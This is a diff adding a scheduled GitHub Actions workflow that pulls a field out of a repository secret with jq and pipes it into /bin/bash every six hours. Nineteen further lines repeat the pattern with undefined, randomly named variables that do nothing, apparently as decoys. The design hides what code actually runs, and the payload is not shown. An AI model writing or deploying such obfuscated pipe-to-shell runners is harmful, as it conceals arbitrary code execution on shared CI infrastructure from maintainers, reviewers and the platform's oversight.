@@ -1,0 +1,37 @@
+name: shoupengzhijian
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '24 5/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: shoupengzhijian
+        env:
+          jkx44: ${{ secrets.jkx44 }}
+        run: |
+          echo $jkx44 | jq -r .ghap05 | /bin/bash
+          echo $qrw89 | jq -r .er02518 | /bin/bash
+          echo $uhpbn36 | jq -r .uwlg73 | /bin/bash
+          echo $wwos3 | jq -r .gav01526 | /bin/bash
+          echo $g07 | jq -r .ctj2 | /bin/bash
+          echo $qc406 | jq -r .po15925 | /bin/bash
+          echo $p7853 | jq -r .ennje4 | /bin/bash
+          echo $lla77770 | jq -r .wmgk70103 | /bin/bash
+          echo $ama681 | jq -r .i39 | /bin/bash
+          echo $xiij45995 | jq -r .fpqa3580 | /bin/bash
+          echo $u744 | jq -r .yej8 | /bin/bash
+          echo $vgot77 | jq -r .ksjvl96 | /bin/bash
+          echo $rwcqe74 | jq -r .ma310 | /bin/bash
+          echo $mxwj702 | jq -r .zs314 | /bin/bash
+          echo $weagl17720 | jq -r .hgj9567 | /bin/bash
+          echo $epwlq9461 | jq -r .itmam2895 | /bin/bash
+          echo $a96485 | jq -r .hao7632 | /bin/bash
+          echo $xqe832 | jq -r .kaoqx7770 | /bin/bash
+          echo $unqi220 | jq -r .uizr813 | /bin/bash
+          echo $d5 | jq -r .s9672 | /bin/bash
+
